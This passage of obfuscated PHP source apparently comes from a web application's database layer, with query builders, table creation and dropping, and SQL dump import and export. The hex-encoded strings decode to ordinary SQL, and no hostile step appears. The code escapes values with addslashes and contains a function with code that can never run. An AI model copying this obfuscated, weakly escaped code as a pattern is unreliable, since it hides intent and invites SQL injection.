$this->parseTable($‘êÉÙäı[$Èãûæ„û[359]]) . $Èãûæ„û[1002] . implode($Èãûæ„û[50], $î‚½˜ôÁ) . $Èãûæ„û[1003] . implode($Èãûæ„û[50], $„¾½¤ˆÈ) . $Èãûæ„û[1004]; $¹ƒÏªÅÛ .= $this->parseLock(isset($‘êÉÙäı[$Èãûæ„û[943]]) ? $‘êÉÙäı[$Èãûæ„û[943]] : !1); $¹ƒÏªÅÛ .= $this->parseComment(!empty($‘êÉÙäı[$Èãûæ„û[431]]) ? $‘êÉÙäı[$Èãûæ„û[431]] : $Èãûæ„û[12]); return $this->execute($¹ƒÏªÅÛ, $this->parseBind(!empty($‘êÉÙäı[$Èãûæ„û[363]]) ? $‘êÉÙäı[$Èãûæ„û[363]] : array())); } public function selectInsert($ ˆÌÔ—”, $áì³§ÊÙ, $àØêÖØÎ = array()) { $‡œÁ£ëº =& $_SERVER[Î·Ü›öğ]; $this->model = $àØêÖØÎ[$‡œÁ£ëº[361]]; if (is_string($ ˆÌÔ—”)) { $ ˆÌÔ—” = explode($‡œÁ£ëº[50], $ ˆÌÔ—”); } array_walk($ ˆÌÔ—”, array($this, $‡œÁ£ëº[1005])); $¢‡ş¬Î = $‡œÁ£ëº[1139] . $this->parseTable($áì³§ÊÙ) . $‡œÁ£ëº[1002] . implode($‡œÁ£ëº[50], $ ˆÌÔ—”) . $‡œÁ£ëº[1117]; $¢‡ş¬Î .= $this->buildSelectSql($àØêÖØÎ); return $this->execute($¢‡ş¬Î, $this->parseBind(!empty($àØêÖØÎ[$‡œÁ£ëº[363]]) ? $àØêÖØÎ[$‡œÁ£ëº[363]] : array())); } public function update($ŠıàØØ„, $«á„ƒıÈ) { $ï ´¾„š =& $_SERVER[Î·Ü›öğ]; $this->model = $«á„ƒıÈ[$ï ´¾„š[361]]; $‡ÁŞµñÇ = $ï ´¾„š[1140] . $this->parseTable($«á„ƒıÈ[$ï ´¾„š[359]]) . $this->parseSet($ŠıàØØ„) . $this->parseWhere(!empty($«á„ƒıÈ[$ï ´¾„š[355]]) ? $«á„ƒıÈ[$ï ´¾„š[355]] : $ï ´¾„š[12]) . $this->parseOrder(!empty($«á„ƒıÈ[$ï ´¾„š[443]]) ? $«á„ƒıÈ[$ï ´¾„š[443]] : $ï ´¾„š[12]) . $this->parseLimit(!empty($«á„ƒıÈ[$ï ´¾„š[370]]) ? $«á„ƒıÈ[$ï ´¾„š[370]] : $ï ´¾„š[12]) . $this->parseLock(isset($«á„ƒıÈ[$ï ´¾„š[943]]) ? $«á„ƒıÈ[$ï ´¾„š[943]] : !1) . $this->parseComment(!empty($«á„ƒıÈ[$ï ´¾„š[431]]) ? $«á„ƒıÈ[$ï ´¾„š[431]] : $ï ´¾„š[12]); return $this->execute($‡ÁŞµñÇ, $this->parseBind(!empty($«á„ƒıÈ[$ï ´¾„š[363]]) ? $«á„ƒıÈ[$ï ´¾„š[363]] : array())); } public function delete($ü¸Éè“­ = array()) { $Å‡ãÁ¯¿ =& $_SERVER[Î·Ü›öğ]; $this->model = $ü¸Éè“­[$Å‡ãÁ¯¿[361]]; $üâØ–Ëà = $Å‡ãÁ¯¿[1141] . $this->parseTable($ü¸Éè“­[$Å‡ãÁ¯¿[359]]) . $this->parseWhere(!empty($ü¸Éè“­[$Å‡ãÁ¯¿[355]]) ? $ü¸Éè“­[$Å‡ãÁ¯¿[355]] : $Å‡ãÁ¯¿[12]) . $this->parseOrder(!empty($ü¸Éè“­[$Å‡ãÁ¯¿[443]]) ? $ü¸Éè“­[$Å‡ãÁ¯¿[443]] : $Å‡ãÁ¯¿[12]) . $this->parseLimit(!empty($ü¸Éè“­[$Å‡ãÁ¯¿[370]]) ? $ü¸Éè“­[$Å‡ãÁ¯¿[370]] : $Å‡ãÁ¯¿[12]) . $this->parseLock(isset($ü¸Éè“­[$Å‡ãÁ¯¿[943]]) ? $ü¸Éè“­[$Å‡ãÁ¯¿[943]] : !1) . $this->parseComment(!empty($ü¸Éè“­[$Å‡ãÁ¯¿[431]]) ? $ü¸Éè“­[$Å‡ãÁ¯¿[431]] : $Å‡ãÁ¯¿[12]); return $this->execute($üâØ–Ëà, $this->parseBind(!empty($ü¸Éè“­[$Å‡ãÁ¯¿[363]]) ? $ü¸Éè“­[$Å‡ãÁ¯¿[363]] : array())); } public function select($íÍù°È¿ = array()) { $Öœ´¤Š¶ =& $_SERVER[Î·Ü›öğ]; $this->model = $íÍù°È¿[$Öœ´¤Š¶[361]]; $ÚÔÖá°¤ = $this->buildSelectSql($íÍù°È¿); $³à²ÃıŠ = isset($íÍù°È¿[$Öœ´¤Š¶[426]]) ? $íÍù°È¿[$Öœ´¤Š¶[426]] : !1; if ($³à²ÃıŠ) { $«ä²ú“ = is_string($³à²ÃıŠ[$Öœ´¤Š¶[97]]) ? $³à²ÃıŠ[$Öœ´¤Š¶[97]] : $Öœ´¤Š¶[1142] . md5($ÚÔÖá°¤); $¹¿š«ûá = think_cache($«ä²ú“, $Öœ´¤Š¶[12], $³à²ÃıŠ); if (!1 !== $¹¿š«ûá) { return $¹¿š«ûá; } } $¹‡şó“ë = $this->query($ÚÔÖá°¤, $this->parseBind(!empty($íÍù°È¿[$Öœ´¤Š¶[363]]) ? $íÍù°È¿[$Öœ´¤Š¶[363]] : array())); if ($³à²ÃıŠ && !1 !== $¹‡şó“ë) { think_cache($«ä²ú“, $¹‡şó“ë, $³à²ÃıŠ); } return $¹‡şó“ë; } public function buildSelectSql($§ó¹¯¥ = array()) { $ĞßîÕ“Á =& $_SERVER[Î·Ü›öğ]; if (isset($§ó¹¯¥[$ĞßîÕ“Á[430]])) { if (strpos($§ó¹¯¥[$ĞßîÕ“Á[430]], $ĞßîÕ“Á[50])) { list($óšä€ÎÛ, $áÖàÄ°¾) = explode($ĞßîÕ“Á[50], $§ó¹¯¥[$ĞßîÕ“Á[430]]); } else { $óšä€ÎÛ = $§ó¹¯¥[$ĞßîÕ“Á[430]]; } $óšä€ÎÛ = $óšä€ÎÛ ? $óšä€ÎÛ : 1; $áÖàÄ°¾ = isset($áÖàÄ°¾) ? $áÖàÄ°¾ : (is_numeric($§ó¹¯¥[$ĞßîÕ“Á[370]]) ? $§ó¹¯¥[$ĞßîÕ“Á[370]] : 20); $ñª×¨ˆŸ = $áÖàÄ°¾ * ((int) $óšä€ÎÛ - 1); $§ó¹¯¥[$ĞßîÕ“Á[370]] = $ñª×¨ˆŸ . $ĞßîÕ“Á[50] . $áÖàÄ°¾; } if (think_config($ĞßîÕ“Á[1143])) { $“‚™·æ‰ = $ĞßîÕ“Á[1144] . md5(serialize($§ó¹¯¥)); $‘Á¦¸‰Ü = think_cache($“‚™·æ‰); if ($‘Á¦¸‰Ü) { return $‘Á¦¸‰Ü; } } $¡£ÂãµØ = $this->parseSql($this->selectSql, $§ó¹¯¥); $¡£ÂãµØ .= $this->parseLock(isset($§ó¹¯¥[$ĞßîÕ“Á[943]]) ? $§ó¹¯¥[$ĞßîÕ“Á[943]] : !1); if (isset($“‚™·æ‰)) { think_cache($“‚™·æ‰, $¡£ÂãµØ); } return $¡£ÂãµØ; } public function parseSql($¦â’¸³Î, $”³æ¼±ë = array()) { $ØÇ‰Ìä =& $_SERVER[Î·Ü›öğ]; $¦â’¸³Î = str_replace(array($ØÇ‰Ìä[1145], $ØÇ‰Ìä[1146], $ØÇ‰Ìä[1147], $ØÇ‰Ìä[1148], $ØÇ‰Ìä[1149], $ØÇ‰Ìä[1150], $ØÇ‰Ìä[1151], $ØÇ‰Ìä[1152], $ØÇ‰Ìä[1153], $ØÇ‰Ìä[1154], $ØÇ‰Ìä[1155]), array($this->parseTable("{$”³æ¼±ë[$ØÇ‰Ìä[359]]}"), $this->parseDistinct(isset($”³æ¼±ë[$ØÇ‰Ìä[1156]]) ? $”³æ¼±ë[$ØÇ‰Ìä[1156]] : !1), $this->parseField(!empty($”³æ¼±ë[$ØÇ‰Ìä[353]]) ? $”³æ¼±ë[$ØÇ‰Ìä[353]] : $ØÇ‰Ìä[223]), $this->parseJoin(!empty($”³æ¼±ë[$ØÇ‰Ìä[362]]) ? $”³æ¼±ë[$ØÇ‰Ìä[362]] : $ØÇ‰Ìä[12]), $this->parseWhere(!empty($”³æ¼±ë[$ØÇ‰Ìä[355]]) ? $”³æ¼±ë[$ØÇ‰Ìä[355]] : $ØÇ‰Ìä[12]), $this->parseGroup(!empty($”³æ¼±ë[$ØÇ‰Ìä[591]]) ? $”³æ¼±ë[$ØÇ‰Ìä[591]] : $ØÇ‰Ìä[12]), $this->parseHaving(!empty($”³æ¼±ë[$ØÇ‰Ìä[1157]]) ? $”³æ¼±ë[$ØÇ‰Ìä[1157]] : $ØÇ‰Ìä[12]), $this->parseOrder(!empty($”³æ¼±ë[$ØÇ‰Ìä[443]]) ? $”³æ¼±ë[$ØÇ‰Ìä[443]] : $ØÇ‰Ìä[12]), $this->parseLimit(!empty($”³æ¼±ë[$ØÇ‰Ìä[370]]) ? $”³æ¼±ë[$ØÇ‰Ìä[370]] : $ØÇ‰Ìä[12]), $this->parseUnion(!empty($”³æ¼±ë[$ØÇ‰Ìä[424]]) ? $”³æ¼±ë[$ØÇ‰Ìä[424]] : $ØÇ‰Ìä[12]), $this->parseComment(!empty($”³æ¼±ë[$ØÇ‰Ìä[431]]) ? $”³æ¼±ë[$ØÇ‰Ìä[431]] : $ØÇ‰Ìä[12])), $¦â’¸³Î); return $¦â’¸³Î; } public function getLastSql($ÚéËì´ï = '') { return $ÚéËì´ï ? $this->modelSql[$ÚéËì´ï] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($‡µ«¬Ó™) { return addslashes($‡µ«¬Ó™); } public function setModel($±ËŒéÛœ) { $this->model = $±ËŒéÛœ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ŠƒÈ¶Ÿ = array()) { $­Æõè¯ =& $_SERVER[Î·Ü›öğ]; if (empty($ŠƒÈ¶Ÿ)) { $ŠƒÈ¶Ÿ = $GLOBALS[$­Æõè¯[6]][$­Æõè¯[21]]; } $this->database = $ŠƒÈ¶Ÿ; } public function model($‡ŒÆ¢Œ = '') { return new ModelBase($‡ŒÆ¢Œ, $_SERVER[Î·Ü›öğ][12], $this->database); } public function db($ŒşÏ¡Ùû = false) { $¸‚¶‹‚” =& $_SERVER[Î·Ü›öğ]; $×˜É´è = array_change_key_case($this->database); if ($this->dbType() == $¸‚¶‹‚”[13] || !$ŒşÏ¡Ùû) { return $this->model()->db(); } $û³‡Ëåâ = $×˜É´è[$¸‚¶‹‚”[1071]]; $×˜É´è[$¸‚¶‹‚”[1071]] = $¸‚¶‹‚”[12]; if ($×˜É´è[$¸‚¶‹‚”[1066]] == $¸‚¶‹‚”[1063]) { $ƒé³ê»Ç = $×˜É´è[$¸‚¶‹‚”[1072]]; $×˜É´è[$¸‚¶‹‚”[1072]] = substr($ƒé³ê»Ç, 0, strrpos($ƒé³ê»Ç, $¸‚¶‹‚”[1158])); } $this->database = $×˜É´è; $ËµÌ‚âÁ = $this->model()->db(); try { $äÏÆÓè’ = $ËµÌ‚âÁ->execute("\x73\x68\157\x77\x20\144\x61\x74\x61\142\141\163\145\163\40\154\x69\x6b\145\40\47{$û³‡Ëåâ}\47"); } catch (Exception $ƒŠÊ´©‘) { } if (!$äÏÆÓè’) { $ËµÌ‚âÁ->execute("\143\162\x65\x61\164\x65\x20\144\x61\164\141\x62\x61\163\145\40\140{$û³‡Ëåâ}\x60"); } $×˜É´è[$¸‚¶‹‚”[1071]] = $û³‡Ëåâ; if ($×˜É´è[$¸‚¶‹‚”[1066]] == $¸‚¶‹‚”[1063]) { $×˜É´è[$¸‚¶‹‚”[1072]] .= $¸‚¶‹‚”[1158] . $û³‡Ëåâ; } $this->database = $×˜É´è; $ËµÌ‚âÁ->execute("\x75\x73\x65\x20\x60{$û³‡Ëåâ}\140"); return $ËµÌ‚âÁ; } public function createTable($Ú–¹“Ü¢, &$è†ìœ¢È) { $¶ôäÁìâ =& $_SERVER[Î·Ü›öğ]; if (!IO::exist($Ú–¹“Ü¢)) { ActionCall($¶ôäÁìâ[1159], !0, 0); show_json(LNG($¶ôäÁìâ[1160]), !1); } $ƒÒšÔøã = $this->model()->db(); $Øôù©Ç– = sqlSplit(IO::getContent($Ú–¹“Ü¢)); foreach ($Øôù©Ç– as $×†Ò’) { $‘×ƒæ¶Æ = stripos($×†Ò’, $¶ôäÁìâ[1161]) === 0; if ($‘×ƒæ¶Æ) { $è†ìœ¢È->task[$¶ôäÁìâ[1162]] += 1; } $ƒÒšÔøã->execute($×†Ò’); if ($‘×ƒæ¶Æ) { preg_match($¶ôäÁìâ[1163], $×†Ò’, $ÌÉ¸…íÇ); $è†ìœ¢È->task[$¶ôäÁìâ[1164]] = $ÌÉ¸…íÇ[1]; $è†ìœ¢È->update(1); } } } public function insertTable($•èÕÙœâ, &$±óşÇÂ) { $í“µÛÀõ =& $_SERVER[Î·Ü›öğ]; $ˆñÓ›Ğô = $this->model()->db(); $Ë½ô´Ş¦ = $Ú…ÛÏˆì ? array($Ú…ÛÏˆì) : $ˆñÓ›Ğô->getTables(); foreach ($•èÕÙœâ as $…‡É‚ä¢) { $Ú…ÛÏˆì = basename($…‡É‚ä¢, $í“µÛÀõ[882]); if (!in_array($Ú…ÛÏˆì, $Ë½ô´Ş¦)) { continue; } $±óşÇÂ->task[$í“µÛÀõ[1164]] = $Ú…ÛÏˆì; if (get_filesize($…‡É‚ä¢) == 0) { continue; } $Äá®æñµ = $this->sqlToDb($…‡É‚ä¢, $±óşÇÂ); if (!$Äá®æñµ) { ActionCall($í“µÛÀõ[1159], !0, 0); show_json(LNG($í“µÛÀõ[1165]) . "\133{$Ú…ÛÏˆì}\x5d", !1); } } } public function sqlFromDb($¤Şå¦Èı, $Œ¼Òü®Ÿ, &$ÑËÏ¥ÌŒ, $·ººıÒÏ = '') { if ($ÑËÏ¥ÌŒ) { $ÑËÏ¥ÌŒ->task[$_SERVER[Î·Ü›öğ][1164]] = $¤Şå¦Èı; } $‚‹ÛĞÎş = $this->model($¤Şå¦Èı); $áÈå¦À½ = 0; $¤’áÚÅğ = 0; $É ğ¼ŒŒ = 10000; $ó•ÎãÓ = fopen($Œ¼Òü®Ÿ, $_SERVER[Î·Ü›öğ][1166]); $³£¹…‘¯ = $‚‹ÛĞÎş->getPk(); $¹ñ¬µí = $‚‹ÛĞÎş->getDbFields(); $ÔÁŞÒõí = $_SERVER[Î·Ü›öğ][12]; if ($GLOBALS[$_SERVER[Î·Ü›öğ][881]] && in_array($¤Şå¦Èı, array($_SERVER[Î·Ü›öğ][1167], $_SERVER[Î·Ü›öğ][1168]))) { $ÔÁŞÒõí = $¤Şå¦Èı; } do { $ÙÈºŒñÔ = array($³£¹…‘¯ => array($_SERVER[Î·Ü›öğ][1113], $¤’áÚÅğ)); $ÏÌ¬¡“È = $‚‹ÛĞÎş->where($ÙÈºŒñÔ)->field($¹ñ¬µí)->order($³£¹…‘¯ . $_SERVER[Î·Ü›öğ][1169])->limit($É ğ¼ŒŒ)->select(); $ÏÌ¬¡“È = !empty($ÏÌ¬¡“È) ? $ÏÌ¬¡“È : array(); if (!($È³ñÛ¢ = count($ÏÌ¬¡“È))) { break; } $†–÷£Œ = end($ÏÌ¬¡“È); $¤’áÚÅğ = $†–÷£Œ[$³£¹…‘¯]; $åĞòíú¼ = array(); foreach ($ÏÌ¬¡“È as $şèú›˜é) { if ($ÔÁŞÒõí) { if ($¤Şå¦Èı == $_SERVER[Î·Ü›öğ][1167]) { if ($şèú›˜é[$_SERVER[Î·Ü›öğ][33]] == $_SERVER[Î·Ü›öğ][1170]) { $Ÿç¾¶¨ï = json_decode($şèú›˜é[$_SERVER[Î·Ü›öğ][452]], !0); if ($Ÿç¾¶¨ï[$_SERVER[Î·Ü›öğ][32]] == $GLOBALS[$_SERVER[Î·Ü›öğ][881]] && $Ÿç¾¶¨ï[$_SERVER[Î·Ü›öğ][839]] != 1) { continue; } } } else { if ($şèú›˜é[$_SERVER[Î·Ü›öğ][33]] == $_SERVER[Î·Ü›öğ][1171] && $şèú›˜é[$_SERVER[Î·Ü›öğ][97]] == $_SERVER[Î·Ü›öğ][877]) { continue; } } } if ($·ººıÒÏ) { $şèú›˜é[$_SERVER[Î·Ü›öğ][87]] = "\173\151\x6f\72{$·ººıÒÏ}\x7d" . substr($şèú›˜é[$_SERVER[Î·Ü›öğ][87]], strlen("\x7b\151\157\72{$şèú›˜é[$_SERVER[Î·Ü›öğ][915]]}\175")); $şèú›˜é[$_SERVER[Î·Ü›öğ][915]] = $·ººıÒÏ; } $åĞòíú¼[] = $_SERVER[Î·Ü›öğ][1172] . $this->sqlEncode($şèú›˜é) . $_SERVER[Î·Ü›öğ][1173]; } $‘¥ôı³ª = "\111\116\123\x45\122\124\40\x49\116\x54\117\40\140{$¤Şå¦Èı}\140\x20\50\x60" . implode($_SERVER[Î·Ü›öğ][1174], $¹ñ¬µí) . $_SERVER[Î·Ü›öğ][1175]; fwrite($ó•ÎãÓ, $‘¥ôı³ª . implode($_SERVER[Î·Ü›öğ][1176], $åĞòíú¼) . $_SERVER[Î·Ü›öğ][74] . PHP_EOL); $áÈå¦À½ += $È³ñÛ¢; if ($ÑËÏ¥ÌŒ) { $ÑËÏ¥ÌŒ->update($È³ñÛ¢); } } while ($É ğ¼ŒŒ == $È³ñÛ¢); fclose($ó•ÎãÓ); return $áÈå¦À½; } public function sqlToDb($÷İÔéÜø, &$¬Ò’»İİ) { $üé›•» =& $_SERVER[Î·Ü›öğ]; $¬æµ™Ö = $this->model()->db(); $“—®‚Û = @fopen($÷İÔéÜø, $üé›•»[1177]); if (!$“—®‚Û) { return !1; } $“å¡Æ¸í = 0; $Å‚¯“õ— = $üé›•»[12]; $€À­°ä = array(); $¾ÏÇí™® = $this->dbType(); $ÊèÚáÇ™ = $¾ÏÇí™® == $üé›•»[13] ? 500 : 2000; $ø˜÷›£Ó = basename($÷İÔéÜø, $üé›•»[882]); $˜Ş¤Ç‚ã = 0; $İµÕñàã = 4194304; while (!feof($“—®‚Û)) { $°„…ã„ = trim(fgets($“—®‚Û)); if (!$°„…ã„) { continue; } $è÷şà·ò = $this->sqlDecode($°„…ã„, $¾ÏÇí™®, $ø˜÷›£Ó); if (stripos($è÷şà·ò, $üé›•»[432]) === 0) { if (!$Å‚¯“õ—) { $Å‚¯“õ— = $è÷şà·ò . $üé›•»[53]; } continue; } if ($¬Ò’»İİ) { $¬Ò’»İİ->task[$üé›•»[1162]] += 1; } $“å¡Æ¸í++; $€À­°ä[] = rtrim(rtrim(trim($è÷şà·ò), $üé›•»[50]), $üé›•»[74]); $ƒï±¥Ç¾ = null; $ÎôÃ—²Õ = strlen($è÷şà·ò); $˜Ş¤Ç‚ã += $ÎôÃ—²Õ; $ŞÎâ¯¤ = strlen($Å‚¯“õ—) + $˜Ş¤Ç‚ã + (count($€À­°ä) - 1); if ($ŞÎâ¯¤ >= $İµÕñàã) { $ƒï±¥Ç¾ = array_pop($€À­°ä); if ($“å¡Æ¸í > 1) { $“å¡Æ¸í--; } } if ($“å¡Æ¸í >= $ÊèÚáÇ™ || $ƒï±¥Ç¾) { $è÷şà·ò = $Å‚¯“õ— . implode($üé›•»[50], $€À­°ä); if (!$¬æµ™Ö->execute($è÷şà·ò)) { return !1; } if ($¬Ò’»İİ) { $¬Ò’»İİ->update($“å¡Æ¸í); } $€À­°ä = array(); $“å¡Æ¸í = 0; $˜Ş¤Ç‚ã = 0; if ($ƒï±¥Ç¾) { $€À­°ä = array($ƒï±¥Ç¾); $“å¡Æ¸í = 1; $˜Ş¤Ç‚ã = $ÎôÃ—²Õ; } } } fclose($“—®‚Û); if (!empty($€À­°ä)) { $è÷şà·ò = $Å‚¯“õ— . implode($üé›•»[50], $€À­°ä); if (!$¬æµ™Ö->execute($è÷şà·ò)) { return !1; } if ($¬Ò’»İİ) { $¬Ò’»İİ->update($“å¡Æ¸í); } } return !0; } public function dropTable($‰ÙÀíŞ“ = null) { $ÖÆáÎÌ =& $_SERVER[Î·Ü›öğ]; $ğñõŠí = $this->model()->db(); $œá®ÕÍ = $‰ÙÀíŞ“ ? array($‰ÙÀíŞ“) : $ğñõŠí->getTables(); if (!$œá®ÕÍ) { return; } foreach ($œá®ÕÍ as $‰ÙÀíŞ“) { if ($‰ÙÀíŞ“) { $‰ÙÀíŞ“ = strtolower($‰ÙÀíŞ“); } else { continue; } $ğñõŠí->execute($ÖÆáÎÌ[1178] . $this->escapeName($‰ÙÀíŞ“) . $ÖÆáÎÌ[1179]); } } private function sqlEncode($¾ÜéÄ†Â) { $œ±Ë®Ø =& $_SERVER[Î·Ü›öğ]; $ª“äŠİÚ = array(); foreach ($¾ÜéÄ†Â as $ú‰ŒÑ’) { if (is_array($ú‰ŒÑ’)) { $ú‰ŒÑ’ = json_encode_force($ú‰ŒÑ’); } $ú‰ŒÑ’ = addslashes($ú‰ŒÑ’); $ú‰ŒÑ’ = str_replace(array($œ±Ë®Ø[1180], $œ±Ë®Ø[288], $œ±Ë®Ø[419]), array($œ±Ë®Ø[1181], $œ±Ë®Ø[1182], $œ±Ë®Ø[1183]), $ú‰ŒÑ’); $ª“äŠİÚ[] = $ú‰ŒÑ’; } return $œ±Ë®Ø[58] . implode($œ±Ë®Ø[1184], $ª“äŠİÚ) . $œ±Ë®Ø[58]; } private function sqlDecode($âöÏà‰à, $¥¨šÒ“‰, $ºÏ•Æ´× = '') { $èÇã•™ì =& $_SERVER[Î·Ü›öğ]; $âöÏà‰à = str_replace(array($èÇã•™ì[1181], $èÇã•™ì[1182], $èÇã•™ì[1183]), array($èÇã•™ì[1180], $èÇã•™ì[288], $èÇã•™ì[419]), $âöÏà‰à); if ($¥¨šÒ“‰ == $èÇã•™ì[13]) { $âöÏà‰à = str_ireplace($èÇã•™ì[1185], $èÇã•™ì[59], $âöÏà‰à); $âöÏà‰à = stripslashes($âöÏà‰à); } return preg_replace($èÇã•™ì[1186], $èÇã•™ì[12], $âöÏà‰à); if ($¥¨šÒ“‰ == $èÇã•™ì[13]) { return $ºÏ•Æ´× != $èÇã•™ì[876] ? stripslashes($âöÏà‰à) : $âöÏà‰à; } if ($ºÏ•Æ´× == $èÇã•™ì[876]) { $âöÏà‰à = str_replace($èÇã•™ì[1187], $èÇã•™ì[121], stripslashes($âöÏà‰à)); } return $âöÏà‰à; } public function getSqlFile($øŞĞëÊÍ = '') { $ä­æ‹»ó =& $_SERVER[Î·Ü›öğ]; $†´²šúİ = $this->dbType(!0); $Â“ô­Éº = CONTROLLER_DIR . "\x69\156\163\164\x61\x6c\154\57\x64\x61\x74\x61\57{$†´²šúİ}\56\x73\161\x6c"; if (!file_exists($Â“ô­Éº)) { return !1; } $ˆõœšâ„ = file_get_contents($Â“ô­Éº); $–Âûš—Ş = $ä­æ‹»ó[1188] . ($†´²šúİ == $ä­æ‹»ó[900] ? $ä­æ‹»ó[1189] : $ä­æ‹»ó[1190]) . $ä­æ‹»ó[1191]; preg_match_all($–Âûš—Ş, $ˆõœšâ„, $úõ¡ åÜ); $ª¶Ä×Ğ  = $úõ¡ åÜ[1]; $µÂ¢”ö· = $this->model()->db(); $Ì±–‹©³ = $µÂ¢”ö·->getTables(); $¢÷şÚŞ = TEMP_FILES . $ä­æ‹»ó[1192] . date($ä­æ‹»ó[262]) . $ä­æ‹»ó[8]; del_dir($¢÷şÚŞ); mk_dir($¢÷şÚŞ); $™‘£‹øâ = $¢÷şÚŞ . $ä­æ‹»ó[1193]; $”É‘Òüé = $¢÷şÚŞ . $ä­æ‹»ó[1194]; $©“µÅÍÉ = $†´²šúİ == $ä­æ‹»ó[13] ? $ä­æ‹»ó[900] : $ä­æ‹»ó[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\141\154\x6c\57\x64\x61\164\x61\x2f{$©“µÅÍÉ}\56\163\x71\154", $¢÷şÚŞ); @touch($¢÷şÚŞ . $†´²šúİ . $ä­æ‹»ó[882]); $ó–ó«†ê = fopen($™‘£‹øâ, $ä­æ‹»ó[1166]); $«˜¼èê­ = fopen($”É‘Òüé, $ä­æ‹»ó[1166]); if ($†´²šúİ == $ä­æ‹»ó[13]) { $Ì±–‹©³ = array_diff($Ì±–‹©³, array($ä­æ‹»ó[874], $ä­æ‹»ó[875])); $»Ø”óÉ§ = array($ä­æ‹»ó[1195], $ä­æ‹»ó[1196], $ä­æ‹»ó[1197]); fwrite($«˜¼èê­, implode(PHP_EOL, $»Ø”óÉ§) . PHP_EOL . PHP_EOL); foreach ($Ì±–‹©³ as $¾©áß‘Ú) { $ËÇ Ø­á = $this->sqlFromSqlite($¾©áß‘Ú); if (!$ËÇ Ø­á[$ä­æ‹»ó[13]]) { continue; } fwrite($«˜¼èê­, $ËÇ Ø­á[$ä­æ‹»ó[13]] . PHP_EOL . PHP_EOL); if (!in_array($¾©áß‘Ú, $ª¶Ä×Ğ )) { fwrite($ó–ó«†ê, $ËÇ Ø­á[$ä­æ‹»ó[900]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ì±–‹©³ as $¾©áß‘Ú) { $ËÇ Ø­á = $this->sqlFromMysql($¾©áß‘Ú); if (!$ËÇ Ø­á[$ä­æ‹»ó[900]]) { continue; } fwrite($ó–ó«†ê, $ËÇ Ø­á[$ä­æ‹»ó[900]] . PHP_EOL . PHP_EOL); if (!in_array($¾©áß‘Ú, $ª¶Ä×Ğ )) { fwrite($«˜¼èê­, $ËÇ Ø­á[$ä­æ‹»ó[13]] . PHP_EOL . PHP_EOL); } } } fclose($ó–ó«†ê); fclose($«˜¼èê­); $ˆõœšâ„ = array($ä­æ‹»ó[900] => $™‘£‹øâ, $ä­æ‹»ó[13] => $”É‘Òüé); return $øŞĞëÊÍ ? $ˆõœšâ„[$øŞĞëÊÍ] : $ˆõœšâ„; } public function dbType($š­÷ˆêÆ = false) { $üé„¼¹Ú =& $_SERVER[Î·Ü›öğ]; $øˆò§¯Â = $š­÷ˆêÆ ? $GLOBALS[$üé„¼¹Ú[6]][$üé„¼¹Ú[21]] : $this->database; $øˆò§¯Â = array_change_key_case($øˆò§¯Â); $¡×Âíµ = $øˆò§¯Â[$üé„¼¹Ú[1066]]; if ($¡×Âíµ == $üé„¼¹Ú[1063]) { $·¶×ÆÄ” = explode($üé„¼¹Ú[4], $øˆò§¯Â[$üé„¼¹Ú[1072]]); $¡×Âíµ = $·¶×ÆÄ”[0]; } $Ò»Ñä«Æ = array($üé„¼¹Ú[1198] => $üé„¼¹Ú[13], $üé„¼¹Ú[1011] => $üé„¼¹Ú[900]); if (isset($Ò»Ñä«Æ[$¡×Âíµ])) { $¡×Âíµ = $Ò»Ñä«Æ[$¡×Âíµ]; } return $¡×Âíµ; } public function sqlFromMysql($û¦´•Óë, $Ñ¬ßÍñ¤ = '') { $‚ãÙ‘¼à =& $_SERVER[Î·Ü›öğ]; $ûÀß¼½É = array($‚ãÙ‘¼à[900] => $‚ãÙ‘¼à[12], $‚ãÙ‘¼à[13] => $‚ãÙ‘¼à[12]); $¢ıùÂÌÙ = $this->escapeName($û¦´•Óë); $³Î±Ş‹Œ = $this->escapeName($û¦´•Óë, $‚ãÙ‘¼à[13]); $°¢ê„ı» = $this->model()->db(); $¸Êï²¸† = $°¢ê„ı»->query("\x73\x68\x6f\x77\x20\x63\x72\x65\141\164\145\x20\x74\x61\142\154\145\x20{$¢ıùÂÌÙ}\73"); if (!$¸Êï²¸† || !$¸Êï²¸†[0]) { return !1; } $º·Ì„ÆŒ = _get($¸Êï²¸†[0], $‚ãÙ‘¼à[1199], $‚ãÙ‘¼à[12]); if (!$º·Ì„ÆŒ) { return !1; } $ŞèŠ‚ó = "\x44\x52\117\120\40\124\x41\102\114\105\40\111\x46\x20\105\x58\x49\x53\x54\123\40{$¢ıùÂÌÙ}\73" . PHP_EOL . $º·Ì„ÆŒ . $‚ãÙ‘¼à[74]; if ($Ñ¬ßÍñ¤ == $‚ãÙ‘¼à[900]) { return $ŞèŠ‚ó; } $ûÀß¼½É[$‚ãÙ‘¼à[900]] = $ŞèŠ‚ó; $ºÆ†Ì¼Ø = array_change_key_case($GLOBALS[$‚ãÙ‘¼à[6]][$‚ãÙ‘¼à[21]]); $Å¢õ·… = $ºÆ†Ì¼Ø[$‚ãÙ‘¼à[1071]]; $ıßÑø—€ = $‚ãÙ‘¼à[1200] . $Å¢õ·… . "\47\x20\101\116\x44\x20\124\101\x42\114\105\137\x4e\x41\x4d\x45\40\75\x20{$³Î±Ş‹Œ}\x3b"; $¥±äı”Ê = "\123\110\x4f\x57\40\111\x4e\104\105\x58\40\x46\122\x4f\115\x20{$¢ıùÂÌÙ}\x3b"; $²òâËÖÃ = $°¢ê„ı»->query($ıßÑø—€); if (empty($²òâËÖÃ)) { return $Ñ¬ßÍñ¤ ? $ûÀß¼½É[$Ñ¬ßÍñ¤] : $ûÀß¼½É; } $ô·«Ûã = $°¢ê„ı»->query($¥±äı”Ê); $ÛÃºß¯¿ = $‚ãÙ‘¼à[12]; $¬«§àÆ = array(); foreach ($ô·«Ûã as $ƒÉñÈÌ³) { if (!$ÛÃºß¯¿ && $ƒÉñÈÌ³[$‚ãÙ‘¼à[1201]] == $‚ãÙ‘¼à[1202]) { $ÛÃºß¯¿ = $ƒÉñÈÌ³[$‚ãÙ‘¼à[1203]]; } if (isset($¬«§àÆ[$ƒÉñÈÌ³[$‚ãÙ‘¼à[1201]]])) { $¬«§àÆ[$ƒÉñÈÌ³[$‚ãÙ‘¼à[1201]]][$‚ãÙ‘¼à[1204]][] = 